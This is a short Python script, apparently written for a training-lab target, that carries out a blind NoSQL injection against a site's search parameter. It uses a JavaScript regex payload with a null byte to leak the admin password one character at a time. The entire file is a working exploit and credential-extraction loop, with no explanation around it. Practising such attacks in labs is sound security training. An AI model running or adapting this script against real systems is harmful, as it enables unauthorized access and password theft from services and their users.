import urllib.request
import string

URL = "http://ptl-e3ae5c0c-c700291e.libcurl.so"


def check(payload):
    try:
        url = URL + \
            "/?search=admin%27%26%26this.password.match(/"+payload+"/)%00"
        print(url)
        resp = urllib.request.urlopen(url)
        data = resp.read()
        return ">admin<" in str(data)
    except:
        print('An exception occurred')


# CHARSET = list(string.ascii_lowercase + string.digits)
CHARSET = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r',
           's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-']


password = ""

while True:
    for c in CHARSET:
        print("Trying: "+c+" for "+password)
        test = password+c
        if check("^"+test+".*$"):
            password += c
            print(password)
            break
        elif c == CHARSET[-1]:
            print(password)
            exit(0)
